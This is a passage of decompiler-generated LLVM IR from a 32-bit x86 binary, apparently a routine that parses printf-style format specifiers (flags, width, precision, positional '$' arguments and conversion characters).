  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ca41 ], [ %v3_804c8b4, %dec_label_pc_804c8c6 ], [ %v3_804c8b4, %dec_label_pc_804c907 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804ca41 ], [ 0, %dec_label_pc_804c8c6 ], [ 0, %dec_label_pc_804c907 ]
  %v7_804c92b = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804c92b = trunc i64 %v7_804c92b to i32
  %v2_804c933 = add i32 %v8_804c92b, 80
  br label %dec_label_pc_804c924

dec_label_pc_804c924:                             ; preds = %dec_label_pc_804c924.outer, %dec_label_pc_804c9e1
  %v0_804c930 = phi i32 [ %v0_804c9ee, %dec_label_pc_804c9e1 ], [ %v0_804c930.ph94, %dec_label_pc_804c924.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804c9e1 ], [ %stack_var_-32.1.ph, %dec_label_pc_804c924.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804c9e1 ], [ %stack_var_-88.1.ph, %dec_label_pc_804c924.outer ]
  store i32 %v0_804c930, i32* @edx, align 4
  %v1_804c924 = inttoptr i32 %v0_804c930 to i8*
  %v2_804c924 = load i8, i8* %v1_804c924, align 1
  %v11_804c924 = icmp eq i8 %v2_804c924, 42
  store i32 %v0_804c930, i32* @esi, align 4
  %v1_804c929 = icmp eq i1 %v11_804c924, false
  br i1 %v1_804c929, label %dec_label_pc_804c93b, label %dec_label_pc_804c92b

dec_label_pc_804c92b:                             ; preds = %dec_label_pc_804c924
  store i32 %v8_804c92b, i32* %eax.global-to-local, align 4
  %v1_804c930 = add i32 %v0_804c930, 1
  store i32 %v1_804c930, i32* @esi, align 4
  %v0_804c933 = load i32, i32* @esp, align 4
  %v3_804c933 = add i32 %v2_804c933, %v0_804c933
  %v4_804c933 = inttoptr i32 %v3_804c933 to i32*
  store i32 0, i32* %v4_804c933, align 4
  %v0_804c955.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c93b

dec_label_pc_804c93b:                             ; preds = %dec_label_pc_804c924, %dec_label_pc_804c92b
  %v0_804c955.pre = phi i32 [ %v0_804c930, %dec_label_pc_804c924 ], [ %v0_804c955.pre.pre, %dec_label_pc_804c92b ]
  %v0_804c93b = load i32, i32* inttoptr (i32 134569376 to i32*), align 32
  store i32 %v0_804c93b, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804c955.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c955

dec_label_pc_804c945:                             ; preds = %dec_label_pc_804c955
  %v1_804c945 = add i32 %v1_804c94d, -4094
  %v6_804c945 = sub i32 4093, %v1_804c94d
  %v7_804c945 = and i32 %v6_804c945, %v1_804c94d
  %v8_804c945 = icmp slt i32 %v7_804c945, 0
  %v9_804c945 = icmp eq i32 %v1_804c945, 0
  %v10_804c945 = icmp slt i32 %v1_804c945, 0
  %v3_804c94b = icmp eq i1 %v10_804c945, %v8_804c945
  %v4_804c94b = icmp eq i1 %v9_804c945, false
  %v5_804c94b = and i1 %v4_804c94b, %v3_804c94b
  br i1 %v5_804c94b, label %dec_label_pc_804c954, label %dec_label_pc_804c94d

dec_label_pc_804c94d:                             ; preds = %dec_label_pc_804c945
  %v3_804c94d = mul i32 %v1_804c94d, 10
  store i32 %v3_804c94d, i32* %eax.global-to-local, align 4
  %v2_804c950 = add i32 %v3_804c94d, -48
  %v3_804c950 = add i32 %v2_804c950, %v2_804c957
  store i32 %v3_804c950, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c954

dec_label_pc_804c954:                             ; preds = %dec_label_pc_804c945, %dec_label_pc_804c94d
  %v0_804c96f32 = phi i32 [ %v1_804c94d, %dec_label_pc_804c945 ], [ %v3_804c950, %dec_label_pc_804c94d ]
  %v4_804c95528 = phi i32 [ %v6_804c955, %dec_label_pc_804c945 ], [ %v3_804c94d, %dec_label_pc_804c94d ]
  %v1_804c954 = add i32 %v0_804c954, 1
  store i32 %v1_804c954, i32* @esi, align 4
  br label %dec_label_pc_804c955

dec_label_pc_804c955:                             ; preds = %dec_label_pc_804c93b, %dec_label_pc_804c954
  %v1_804c94d = phi i32 [ 0, %dec_label_pc_804c93b ], [ %v0_804c96f32, %dec_label_pc_804c954 ]
  %v4_804c955 = phi i32 [ %v4_804c955.pre, %dec_label_pc_804c93b ], [ %v4_804c95528, %dec_label_pc_804c954 ]
  %v0_804c954 = phi i32 [ %v0_804c955.pre, %dec_label_pc_804c93b ], [ %v1_804c954, %dec_label_pc_804c954 ]
  %v1_804c955 = inttoptr i32 %v0_804c954 to i8*
  %v2_804c955 = load i8, i8* %v1_804c955, align 1
  %v3_804c955 = zext i8 %v2_804c955 to i32
  %v5_804c955 = and i32 %v4_804c955, -256
  %v6_804c955 = or i32 %v3_804c955, %v5_804c955
  store i32 %v6_804c955, i32* %eax.global-to-local, align 4
  %v2_804c957 = sext i8 %v2_804c955 to i32
  store i32 %v2_804c957, i32* @ecx, align 4
  %v2_804c95a = mul nsw i32 %v2_804c957, 2
  %v3_804c95a = add i32 %v2_804c95a, %v0_804c93b
  %v4_804c95a = inttoptr i32 %v3_804c95a to i8*
  %v5_804c95a = load i8, i8* %v4_804c95a, align 1
  %v6_804c95a = and i8 %v5_804c95a, 8
  %v7_804c95a = icmp eq i8 %v6_804c95a, 0
  %v1_804c95f = icmp eq i1 %v7_804c95a, false
  br i1 %v1_804c95f, label %dec_label_pc_804c945, label %dec_label_pc_804c961

dec_label_pc_804c961:                             ; preds = %dec_label_pc_804c955
  %v0_804c961 = load i32, i32* @edx, align 4
  %v1_804c961 = add i32 %v0_804c961, -1
  %v2_804c961 = inttoptr i32 %v1_804c961 to i8*
  %v3_804c961 = load i8, i8* %v2_804c961, align 1
  %v12_804c961 = icmp eq i8 %v3_804c961, 37
  %v1_804c965 = icmp eq i1 %v12_804c961, false
  br i1 %v1_804c965, label %dec_label_pc_804c9f8, label %dec_label_pc_804c96b

dec_label_pc_804c96b:                             ; preds = %dec_label_pc_804c961
  %v10_804c96b = icmp eq i8 %v2_804c955, 36
  %v1_804c96d = icmp eq i1 %v10_804c96b, false
  br i1 %v1_804c96d, label %dec_label_pc_804c99f, label %dec_label_pc_804c96f

dec_label_pc_804c96f:                             ; preds = %dec_label_pc_804c96b
  %tmp89 = icmp slt i32 %v1_804c94d, 1
  br i1 %tmp89, label %dec_label_pc_804c99f, label %dec_label_pc_804c973

dec_label_pc_804c973:                             ; preds = %dec_label_pc_804c96f
  %v4_804c973 = icmp eq i32 %stack_var_-88.1, 0
  %v1_804c978 = add i32 %v0_804c954, 1
  store i32 %v1_804c978, i32* @edx, align 4
  br i1 %v4_804c973, label %dec_label_pc_804cc49, label %dec_label_pc_804c981

dec_label_pc_804c981:                             ; preds = %dec_label_pc_804c973
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804c989 = sub i32 %v1_804c94d, %stack_var_-88.1
  %v8_804c989 = xor i32 %v1_804c94d, %stack_var_-88.1
  %v9_804c989 = xor i32 %v2_804c989, %v1_804c94d
  %v10_804c989 = and i32 %v9_804c989, %v8_804c989
  %v11_804c989 = icmp slt i32 %v10_804c989, 0
  %v12_804c989 = icmp eq i32 %v2_804c989, 0
  %v13_804c989 = icmp slt i32 %v2_804c989, 0
  %v3_804c98b = icmp ne i1 %v13_804c989, %v11_804c989
  %v4_804c98b = or i1 %v12_804c989, %v3_804c98b
  %stack_var_-88.1.v0_804c98d = select i1 %v4_804c98b, i32 %stack_var_-88.1, i32 %v1_804c94d
  br label %dec_label_pc_804c99b

dec_label_pc_804c99b:                             ; preds = %dec_label_pc_804c9af, %dec_label_pc_804c981, %dec_label_pc_804c9b3
  %v0_804c99b = phi i32 [ %v1_804c978, %dec_label_pc_804c981 ], [ %v0_804c961, %dec_label_pc_804c9b3 ], [ %v0_804c961, %dec_label_pc_804c9af ]
  %stack_var_-32.2 = phi i32 [ %v1_804c94d, %dec_label_pc_804c981 ], [ %stack_var_-32.1, %dec_label_pc_804c9b3 ], [ %stack_var_-32.1, %dec_label_pc_804c9af ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804c98d, %dec_label_pc_804c981 ], [ 0, %dec_label_pc_804c9b3 ], [ 0, %dec_label_pc_804c9af ]
  store i32 %v0_804c99b, i32* @esi, align 4
  br label %dec_label_pc_804c9c2

dec_label_pc_804c99f:                             ; preds = %dec_label_pc_804c96f, %dec_label_pc_804c96b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804c9af, label %dec_label_pc_804c9a6

dec_label_pc_804c9a6:                             ; preds = %dec_label_pc_804c99f
  %v10_804c9a6 = icmp eq i8 %v2_804c955, 109
  br i1 %v10_804c9a6, label %dec_label_pc_804c9f8, label %dec_label_pc_804cc49

dec_label_pc_804c9af:                             ; preds = %dec_label_pc_804c99f
  %tmp153 = icmp ugt i32 %v0_804c954, %v0_804c961
  br i1 %tmp153, label %dec_label_pc_804c9b3, label %dec_label_pc_804c99b

dec_label_pc_804c9b3:                             ; preds = %dec_label_pc_804c9af
  %v1_804c9b3 = inttoptr i32 %v0_804c961 to i8*
  %v2_804c9b3 = load i8, i8* %v1_804c9b3, align 1
  %v8_804c9b3 = icmp eq i8 %v2_804c9b3, 48
  br i1 %v8_804c9b3, label %dec_label_pc_804c99b, label %dec_label_pc_804c9f8

dec_label_pc_804c9c2:                             ; preds = %dec_label_pc_804c9d3, %dec_label_pc_804c99b
  %v0_804c9ee = phi i32 [ %v1_804c9d3, %dec_label_pc_804c9d3 ], [ %v0_804c99b, %dec_label_pc_804c99b ]
  %v4_804c9cc35 = phi i32 [ %v6_804c9cc, %dec_label_pc_804c9d3 ], [ %v6_804c955, %dec_label_pc_804c99b ]
  store i32 ptrtoint ([8 x i8]* @global_var_8053456.126 to i32), i32* %edx.global-to-local, align 4
  %v1_804c9cf = inttoptr i32 %v0_804c9ee to i8*
  br label %dec_label_pc_804c9cc

dec_label_pc_804c9cc:                             ; preds = %dec_label_pc_804c9dd, %dec_label_pc_804c9c2
  %v4_804c9cc = phi i32 [ %v4_804c9cc35, %dec_label_pc_804c9c2 ], [ %v6_804c9cc, %dec_label_pc_804c9dd ]
  %v0_804c9ce = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053456.126 to i32), %dec_label_pc_804c9c2 ], [ %v1_804c9ce, %dec_label_pc_804c9dd ]
  %v0_804c9dd = phi i32 [ 1, %dec_label_pc_804c9c2 ], [ %v2_804c9dd, %dec_label_pc_804c9dd ]
  store i32 %v0_804c9dd, i32* @ecx, align 4
  %v1_804c9cc = inttoptr i32 %v0_804c9ce to i8*
  %v2_804c9cc = load i8, i8* %v1_804c9cc, align 1
  %v3_804c9cc = zext i8 %v2_804c9cc to i32
  %v5_804c9cc = and i32 %v4_804c9cc, -256
  %v6_804c9cc = or i32 %v3_804c9cc, %v5_804c9cc
  store i32 %v6_804c9cc, i32* %eax.global-to-local, align 4
  %v1_804c9ce = add i32 %v0_804c9ce, 1
  store i32 %v1_804c9ce, i32* @edx, align 4
  %v2_804c9cf = load i8, i8* %v1_804c9cf, align 1
  %v15_804c9cf = icmp eq i8 %v2_804c9cf, %v2_804c9cc
  %v1_804c9d1 = icmp eq i1 %v15_804c9cf, false
  br i1 %v1_804c9d1, label %dec_label_pc_804c9d8, label %dec_label_pc_804c9d3

dec_label_pc_804c9d3:                             ; preds = %dec_label_pc_804c9cc
  %v1_804c9d3 = add i32 %v0_804c9ee, 1
  store i32 %v1_804c9d3, i32* @esi, align 4
  %v0_804c9d4 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c9d4 = or i32 %v0_804c9d4, %v0_804c9dd
  store i32 %v2_804c9d4, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c9c2

dec_label_pc_804c9d8:                             ; preds = %dec_label_pc_804c9cc
  %v1_804c9d8 = inttoptr i32 %v1_804c9ce to i8*
  %v2_804c9d8 = load i8, i8* %v1_804c9d8, align 1
  %v3_804c9d8 = icmp eq i8 %v2_804c9d8, 0
  br i1 %v3_804c9d8, label %dec_label_pc_804c9e1, label %dec_label_pc_804c9dd

dec_label_pc_804c9dd:                             ; preds = %dec_label_pc_804c9d8
  %v2_804c9dd = mul i32 %v0_804c9dd, 2
  br label %dec_label_pc_804c9cc

dec_label_pc_804c9e1:                             ; preds = %dec_label_pc_804c9d8
  %v0_804c9e1 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804c9e5 = udiv i32 %v0_804c9e1, 2
  %v1_804c9e5.not = or i32 %v1_804c9e5, -6
  %v1_804c9ea = xor i32 %v1_804c9e5.not, 5
  store i32 %v1_804c9ea, i32* %eax.global-to-local, align 4
  %v2_804c9ec = and i32 %v1_804c9ea, %v0_804c9e1
  store i32 %v2_804c9ec, i32* %edi.global-to-local, align 4
  %v1_804c9ee = add i32 %v0_804c9ee, -1
  %v2_804c9ee = inttoptr i32 %v1_804c9ee to i8*
  %v3_804c9ee = load i8, i8* %v2_804c9ee, align 1
  %v12_804c9ee = icmp eq i8 %v3_804c9ee, 37
  %v1_804c9f2 = icmp eq i1 %v12_804c9ee, false
  br i1 %v1_804c9f2, label %dec_label_pc_804c924, label %dec_label_pc_804c9f8

dec_label_pc_804c9f8:                             ; preds = %dec_label_pc_804c9b3, %dec_label_pc_804c9e1, %dec_label_pc_804c961, %dec_label_pc_804c9a6
  %v0_804ca1b = phi i32 [ %v1_804c94d, %dec_label_pc_804c9a6 ], [ %v1_804c94d, %dec_label_pc_804c9b3 ], [ 0, %dec_label_pc_804c9e1 ], [ %v1_804c94d, %dec_label_pc_804c961 ]
  %v1_804ca24 = phi i32 [ %v0_804c954, %dec_label_pc_804c9a6 ], [ %v0_804c954, %dec_label_pc_804c9b3 ], [ %v0_804c9ee, %dec_label_pc_804c9e1 ], [ %v0_804c954, %dec_label_pc_804c961 ]
  %v0_804ca21 = phi i32 [ %v0_804c961, %dec_label_pc_804c9a6 ], [ %v0_804c961, %dec_label_pc_804c9b3 ], [ %v1_804c9ce, %dec_label_pc_804c9e1 ], [ %v0_804c961, %dec_label_pc_804c961 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804c9a6 ], [ %stack_var_-32.1, %dec_label_pc_804c9b3 ], [ %stack_var_-32.2, %dec_label_pc_804c9e1 ], [ %stack_var_-32.1, %dec_label_pc_804c961 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804c9a6 ], [ 0, %dec_label_pc_804c9b3 ], [ %stack_var_-88.2, %dec_label_pc_804c9e1 ], [ %stack_var_-88.1, %dec_label_pc_804c961 ]
  %v1_804c9f8 = inttoptr i32 %v0_804ca21 to i8*
  %v2_804c9f8 = load i8, i8* %v1_804c9f8, align 1
  %v11_804c9f8 = icmp eq i8 %v2_804c9f8, 42
  %v1_804c9fb = icmp eq i1 %v11_804c9f8, false
  br i1 %v1_804c9fb, label %dec_label_pc_804ca31, label %dec_label_pc_804c9fd

dec_label_pc_804c9fd:                             ; preds = %dec_label_pc_804c9f8
  %v4_804c9fd = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804c9fd, label %dec_label_pc_804ca21, label %dec_label_pc_804ca04

dec_label_pc_804ca04:                             ; preds = %dec_label_pc_804c9fd
  %v1_804ca04 = inttoptr i32 %v1_804ca24 to i8*
  %v2_804ca04 = load i8, i8* %v1_804ca04, align 1
  %v11_804ca04 = icmp eq i8 %v2_804ca04, 36
  %v1_804ca07 = icmp eq i1 %v11_804ca04, false
  br i1 %v1_804ca07, label %dec_label_pc_804cc49, label %dec_label_pc_804ca0d

dec_label_pc_804ca0d:                             ; preds = %dec_label_pc_804ca04
  %tmp91 = icmp slt i32 %v0_804ca1b, 1
  br i1 %tmp91, label %dec_label_pc_804cc49, label %dec_label_pc_804ca15

dec_label_pc_804ca15:                             ; preds = %dec_label_pc_804ca0d
  store i32 %v8_804c92b, i32* %eax.global-to-local, align 4
  %v1_804ca1a = add i32 %v1_804ca24, 1
  store i32 %v1_804ca1a, i32* @esi, align 4
  %v1_804ca1b = load i32, i32* @esp, align 4
  %v3_804ca1b = add i32 %v8_804c92b, 68
  %v4_804ca1b = add i32 %v3_804ca1b, %v1_804ca1b
  %v5_804ca1b = inttoptr i32 %v4_804ca1b to i32*
  store i32 %v0_804ca1b, i32* %v5_804ca1b, align 4
  %v0_804ca5f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ca2c

dec_label_pc_804ca21:                             ; preds = %dec_label_pc_804c9fd
  %v1_804ca21 = add i32 %v0_804ca21, 1
  store i32 %v1_804ca21, i32* %eax.global-to-local, align 4
  %v12_804ca24 = icmp eq i32 %v1_804ca21, %v1_804ca24
  %v1_804ca26 = icmp eq i1 %v12_804ca24, false
  br i1 %v1_804ca26, label %dec_label_pc_804cc49, label %dec_label_pc_804ca2c

dec_label_pc_804ca2c:                             ; preds = %dec_label_pc_804ca21, %dec_label_pc_804ca15
  %v0_804ca5f.pre.pre.pre = phi i32 [ %v1_804ca24, %dec_label_pc_804ca21 ], [ %v0_804ca5f.pre.pre.pre.pre, %dec_label_pc_804ca15 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ca31

dec_label_pc_804ca31:                             ; preds = %dec_label_pc_804c9f8, %dec_label_pc_804ca2c
  %v0_804ca5f.pre.pre = phi i32 [ %v1_804ca24, %dec_label_pc_804c9f8 ], [ %v0_804ca5f.pre.pre.pre, %dec_label_pc_804ca2c ]
  %v0_804c8ca = phi i32 [ %v0_804ca1b, %dec_label_pc_804c9f8 ], [ -2147483648, %dec_label_pc_804ca2c ]
  %v4_804ca31 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804ca31 = icmp eq i32 %v4_804ca31, 0
  %v1_804ca36 = icmp eq i1 %v5_804ca31, false
  %.pre = inttoptr i32 %v0_804ca5f.pre.pre to i8*
  br i1 %v1_804ca36, label %dec_label_pc_804ca5a, label %dec_label_pc_804ca3c

dec_label_pc_804ca3c:                             ; preds = %dec_label_pc_804ca31
  %v2_804ca3c = load i8, i8* %.pre, align 1
  %v11_804ca3c = icmp eq i8 %v2_804ca3c, 46
  %v1_804ca3f = icmp eq i1 %v11_804ca3c, false
  br i1 %v1_804ca3f, label %dec_label_pc_804ca53, label %dec_label_pc_804ca41

dec_label_pc_804ca41:                             ; preds = %dec_label_pc_804ca3c
  %v1_804ca41 = add i32 %v0_804ca5f.pre.pre, 1
  store i32 %v1_804ca41, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c924.outer

dec_label_pc_804ca53:                             ; preds = %dec_label_pc_804ca3c
  br label %dec_label_pc_804ca5a

dec_label_pc_804ca5a:                             ; preds = %dec_label_pc_804ca31, %dec_label_pc_804ca53
  %stack_var_-96.2 = phi i32 [ %v0_804c8ca, %dec_label_pc_804ca53 ], [ %stack_var_-96.1.ph, %dec_label_pc_804ca31 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804ca53 ], [ %v0_804c8ca, %dec_label_pc_804ca31 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8053404.127 to i32), i32* @edx, align 4
  %v4_804ca5f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ca5f

dec_label_pc_804ca5f:                             ; preds = %dec_label_pc_804ca69, %dec_label_pc_804ca5a
  %v0_804ca69 = phi i32 [ %v1_804ca69, %dec_label_pc_804ca69 ], [ ptrtoint ([9 x i8]* @global_var_8053404.127 to i32), %dec_label_pc_804ca5a ]
  %v4_804ca5f = phi i32 [ %v6_804ca5f, %dec_label_pc_804ca69 ], [ %v4_804ca5f.pre, %dec_label_pc_804ca5a ]
  %v2_804ca5f = load i8, i8* %.pre, align 1
  %v3_804ca5f = zext i8 %v2_804ca5f to i32
  %v5_804ca5f = and i32 %v4_804ca5f, -256
  %v6_804ca5f = or i32 %v3_804ca5f, %v5_804ca5f
  store i32 %v6_804ca5f, i32* %eax.global-to-local, align 4
  %v3_804ca61 = inttoptr i32 %v0_804ca69 to i8*
  %v4_804ca61 = load i8, i8* %v3_804ca61, align 1
  %v15_804ca61 = icmp eq i8 %v2_804ca5f, %v4_804ca61
  br i1 %v15_804ca61, label %dec_label_pc_804c8d1, label %dec_label_pc_804ca69

dec_label_pc_804ca69:                             ; preds = %dec_label_pc_804ca5f
  %v1_804ca69 = add i32 %v0_804ca69, 1
  store i32 %v1_804ca69, i32* @edx, align 4
  %v1_804ca6a = inttoptr i32 %v1_804ca69 to i8*
  %v2_804ca6a = load i8, i8* %v1_804ca6a, align 1
  %v3_804ca6a = icmp eq i8 %v2_804ca6a, 0
  %v1_804ca6d = icmp eq i1 %v3_804ca6a, false
  br i1 %v1_804ca6d, label %dec_label_pc_804ca5f, label %dec_label_pc_804ca6f

dec_label_pc_804ca6f:                             ; preds = %dec_label_pc_804ca69, %dec_label_pc_804c8d1
  %v0_804ca82 = phi i32 [ %v1_804c8d1, %dec_label_pc_804c8d1 ], [ %v0_804ca5f.pre.pre, %dec_label_pc_804ca69 ]
  %v0_804ca7f = phi i32 [ %v0_804ca69, %dec_label_pc_804c8d1 ], [ %v1_804ca69, %dec_label_pc_804ca69 ]
  %v1_804ca71 = add i32 %v0_804ca7f, -134558724
  %v1_804ca76 = add i32 %v0_804ca7f, -134558725
  %v5_804ca76 = sub i32 134558724, %v0_804ca7f
  %v6_804ca76 = and i32 %v1_804ca71, %v5_804ca76
  %v7_804ca76 = icmp slt i32 %v6_804ca76, 0
  %v8_804ca76 = icmp eq i32 %v1_804ca76, 0
  %v9_804ca76 = icmp slt i32 %v1_804ca76, 0
  store i32 %v1_804ca76, i32* %eax.global-to-local, align 4
  %v3_804ca77 = icmp eq i1 %v9_804ca76, %v7_804ca76
  %v4_804ca77 = icmp eq i1 %v8_804ca76, false
  %v5_804ca77 = and i1 %v4_804ca77, %v3_804ca77
  br i1 %v5_804ca77, label %dec_label_pc_804ca83, label %dec_label_pc_804ca79

dec_label_pc_804ca79:                             ; preds = %dec_label_pc_804ca6f
  %v1_804ca79 = inttoptr i32 %v0_804ca82 to i8*
  %v2_804ca79 = load i8, i8* %v1_804ca79, align 1
  %v3_804ca79 = zext i8 %v2_804ca79 to i32
  %v5_804ca79 = and i32 %v1_804ca76, -256
  %v6_804ca79 = or i32 %v3_804ca79, %v5_804ca79
  store i32 %v6_804ca79, i32* %eax.global-to-local, align 4
  %v3_804ca7b = inttoptr i32 %v0_804ca7f to i8*
  %v4_804ca7b = load i8, i8* %v3_804ca7b, align 1
  %v15_804ca7b = icmp eq i8 %v2_804ca79, %v4_804ca7b
  %v1_804ca7d = icmp eq i1 %v15_804ca7b, false
  br i1 %v1_804ca7d, label %dec_label_pc_804ca83, label %dec_label_pc_804ca7f

dec_label_pc_804ca7f:                             ; preds = %dec_label_pc_804ca79
  %v1_804ca7f = add i32 %v0_804ca7f, 9
  store i32 %v1_804ca7f, i32* @edx, align 4
  %v1_804ca82 = add i32 %v0_804ca82, 1
  store i32 %v1_804ca82, i32* @esi, align 4
  br label %dec_label_pc_804ca83

dec_label_pc_804ca83:                             ; preds = %dec_label_pc_804ca79, %dec_label_pc_804ca6f, %dec_label_pc_804ca7f
  %v4_804ca87 = phi i32 [ %v6_804ca79, %dec_label_pc_804ca79 ], [ %v1_804ca76, %dec_label_pc_804ca6f ], [ %v6_804ca79, %dec_label_pc_804ca7f ]
  %v0_804ca87 = phi i32 [ %v0_804ca82, %dec_label_pc_804ca79 ], [ %v0_804ca82, %dec_label_pc_804ca6f ], [ %v1_804ca82, %dec_label_pc_804ca7f ]
  %v0_804ca83 = phi i32 [ %v0_804ca7f, %dec_label_pc_804ca79 ], [ %v0_804ca7f, %dec_label_pc_804ca6f ], [ %v1_804ca7f, %dec_label_pc_804ca7f ]
  %v1_804ca83 = add i32 %v0_804ca83, 9
  %v2_804ca83 = inttoptr i32 %v1_804ca83 to i8*
  %v3_804ca83 = load i8, i8* %v2_804ca83, align 1
  %v4_804ca83 = sext i8 %v3_804ca83 to i32
  store i32 %v4_804ca83, i32* %ebx.global-to-local, align 4
  %v1_804ca87 = inttoptr i32 %v0_804ca87 to i8*
  %v2_804ca87 = load i8, i8* %v1_804ca87, align 1
  %v3_804ca87 = zext i8 %v2_804ca87 to i32
  %v5_804ca87 = and i32 %v4_804ca87, -256
  %v6_804ca87 = or i32 %v3_804ca87, %v5_804ca87
  store i32 %v6_804ca87, i32* %eax.global-to-local, align 4
  %v2_804ca89 = mul nsw i32 %v4_804ca83, 256
  store i32 %v2_804ca89, i32* %ebx.global-to-local, align 4
  %v4_804ca8c = icmp eq i8 %v2_804ca87, 0
  br i1 %v4_804ca8c, label %dec_label_pc_804cc49, label %dec_label_pc_804ca94

dec_label_pc_804ca94:                             ; preds = %dec_label_pc_804ca83
  %v3_804ca94 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ca94, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8053441.128 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ca9d

dec_label_pc_804ca9d:                             ; preds = %dec_label_pc_804caed, %dec_label_pc_804ca94
  %v0_804caed = phi i32 [ %v1_804caed, %dec_label_pc_804caed ], [ ptrtoint ([21 x i8]* @global_var_8053441.128 to i32), %dec_label_pc_804ca94 ]
  %v3_804ca9d = inttoptr i32 %v0_804caed to i8*
  %v4_804ca9d = load i8, i8* %v3_804ca9d, align 1
  %v15_804ca9d = icmp eq i8 %v2_804ca87, %v4_804ca9d
  %v1_804ca9f = icmp eq i1 %v15_804ca9d, false
  br i1 %v1_804ca9f, label %dec_label_pc_804caed, label %dec_label_pc_804caa1

dec_label_pc_804caa1:                             ; preds = %dec_label_pc_804ca9d
  %v1_804caa3 = add i32 %v0_804caed, -134558785
  store i32 %v1_804caa3, i32* %edx.global-to-local, align 4
  %v7_804caac = icmp sgt i32 %v1_804caa3, 17
  br i1 %v7_804caac, label %dec_label_pc_804caae, label %dec_label_pc_804cab7

dec_label_pc_804caae:                             ; preds = %dec_label_pc_804caa1
  %v1_804caae = add i32 %v0_804caed, -134558787
  store i32 %v1_804caae, i32* %eax.global-to-local, align 4
  %v3_804cab1 = and i32 %v2_804ca89, 1024
  %v4_804cab1 = icmp eq i32 %v3_804cab1, 0
  %v1_804cab4 = icmp eq i1 %v4_804cab1, false
  %v4_804cab4 = select i1 %v1_804cab4, i32 %v1_804caae, i32 %v1_804caa3
  store i32 %v4_804cab4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cab7

dec_label_pc_804cab7:                             ; preds = %dec_label_pc_804caa1, %dec_label_pc_804caae
  %v0_804cac0 = phi i32 [ %v1_804caa3, %dec_label_pc_804caa1 ], [ %v4_804cab4, %dec_label_pc_804caae ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053437.129 to i32), i32* %ecx.global-to-local, align 4
  %v2_804cac0 = add i32 %tmp76, 32
  %v3_804cac0 = inttoptr i32 %v2_804cac0 to i32*
  store i32 %v0_804cac0, i32* %v3_804cac0, align 4
  %v0_804cac3.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804cac7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cac3

dec_label_pc_804cac3:                             ; preds = %dec_label_pc_804cac3, %dec_label_pc_804cab7
  %v0_804cac3 = phi i32 [ %v1_804cac3, %dec_label_pc_804cac3 ], [ %v0_804cac3.pre, %dec_label_pc_804cab7 ]
  %v1_804cac3 = add i32 %v0_804cac3, 1
  store i32 %v1_804cac3, i32* %ecx.global-to-local, align 4
  %v1_804cac4 = inttoptr i32 %v1_804cac3 to i8*
  %v2_804cac4 = load i8, i8* %v1_804cac4, align 1
  %v3_804cac4 = sext i8 %v2_804cac4 to i32
  store i32 %v3_804cac4, i32* %eax.global-to-local, align 4
  %v8_804cac9 = icmp sgt i32 %v0_804cac7.pre, %v3_804cac4
  br i1 %v8_804cac9, label %dec_label_pc_804cac3, label %dec_label_pc_804cacb

dec_label_pc_804cacb:                             ; preds = %dec_label_pc_804cac3
  store i32 ptrtoint ([21 x i8]* @global_var_8053441.128 to i32), i32* @ecx, align 4
  %v1_804cad2 = add i32 %v0_804cac3, -134558775
  store i32 %v1_804cad2, i32* %eax.global-to-local, align 4
  %v2_804cad7 = add i32 %v0_804cac3, add (i32 ptrtoint (i32* @global_var_8053428.130 to i32), i32 -134558775)
  %v3_804cad7 = add i32 %v2_804cad7, %v1_804cad2
  %v4_804cad7 = inttoptr i32 %v3_804cad7 to i16*
  %v5_804cad7 = load i16, i16* %v4_804cad7, align 2
  %v6_804cad7 = sext i16 %v5_804cad7 to i32
  store i32 %v6_804cad7, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804cad2, 2
  %v3_804cadf = add i32 %factor, 134558744
  %v4_804cadf = inttoptr i32 %v3_804cadf to i16*
  %v5_804cadf = load i16, i16* %v4_804cadf, align 2
  %v6_804cadf = sext i16 %v5_804cadf to i32
  store i32 %v6_804cadf, i32* %eax.global-to-local, align 4
  %v1_804cae7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cae7 = or i32 %v1_804cae7, %v6_804cad7
  %v2_804cae9 = and i32 %v2_804cae7, %v6_804cadf
  store i32 %v2_804cae9, i32* %edx.global-to-local, align 4
  %v0_804cafb.pre = load i32, i32* @esi, align 4
